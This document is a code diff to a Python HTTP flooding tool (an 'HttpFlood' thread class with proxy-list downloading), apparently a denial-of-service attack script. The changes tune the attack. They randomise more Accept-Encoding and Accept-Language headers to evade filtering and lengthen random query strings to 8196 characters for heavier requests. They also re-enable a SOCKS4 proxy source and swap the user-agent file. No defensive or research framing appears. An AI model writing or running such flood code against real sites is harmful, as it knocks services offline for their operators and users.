@@ -879,8 +879,8 @@ class HttpFlood(Thread):
             "gzip;q=1.0, deflate;q=0.6, *;q=0.2",
         ] 
 
-        for x in range(10):
-            acceptencode.append(f"br;q={round(random.random(), 1)} gzip;q={round(random.random(), 1)}, deflate;q={round(random.random(), 1)}, *;q=0.3")
+        for x in range(40):
+            acceptencode.append(f"br;q={round(random.random(), 1)} gzip;q={round(random.random(), 1)}, deflate;q={round(random.random(), 1)}, *;q={round(random.random(), 1)}")
 
         self._acceptencode = list(acceptencode)
 
@@ -899,6 +899,7 @@ class HttpFlood(Thread):
             "ru,cn;q=0.5,kr;q=0.2",
             "id;q=0.9,cn;q=0.5,ar;q=0.2",
             "id;q=0.6,ms;q=0.5,nl;q=0.2",
+            "prs-Arab=0.9,en;q=0.5,fa;q=0.2",
         ]  
         self._acceptlang = list(acceptlang)
 
@@ -1474,7 +1475,7 @@ class HttpFlood(Thread):
                     with s.get(str(self._target), timeout=200) as res:
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
-                    with s.get(str(self._target) + "?=" + ProxyTools.Random.rand_str(random.randint(1,1024)), timeout=200) as res:
+                    with s.get(str(self._target) + "?=" + ProxyTools.Random.rand_str(random.randint(1,8196)), timeout=200) as res:
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
             except:
@@ -2842,7 +2843,7 @@ def DownloadProxies(proxy_ver: str, out_file: str):
 			#"https://spys.me/socks.txt",
 			#"https://www.freeproxychecker.com/result/socks4_proxies.txt",
 			"https://www.proxy-list.download/api/v1/get?type=socks4",
-			#"https://www.proxyscan.io/download?type=socks4",
+			"https://www.proxyscan.io/download?type=socks4",
 			"https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
 			"https://api.openproxylist.xyz/socks4.txt",
 		]
@@ -3026,7 +3027,7 @@ if __name__ == '__main__':
                 proxy_ty = int(argv[3].strip())
                 proxy_li = Path(__dir__ / "files/proxies/" /
                                 argv[5].strip())
-                useragent_li = Path(__dir__ / "files/ua.txt")
+                useragent_li = Path(__dir__ / "files/useragent3.txt")
                 referers_li = Path(__dir__ / "files/referers.txt")
                 bombardier_path = Path.home() / "go/bin/bombardier"
                 proxies: Any = set()
@@ -3063,7 +3064,7 @@ if __name__ == '__main__':
                         "RPC (Request Pre Connection) is higher than 100")
 
                 # get the up-to-date proxies
-                DownloadProxies(proxy_ty, proxy_li)
+                #DownloadProxies(proxy_ty, proxy_li)
 
                 proxies = handleProxyList(con, proxy_li, proxy_ty, url)
                 for thread_id in range(threads):
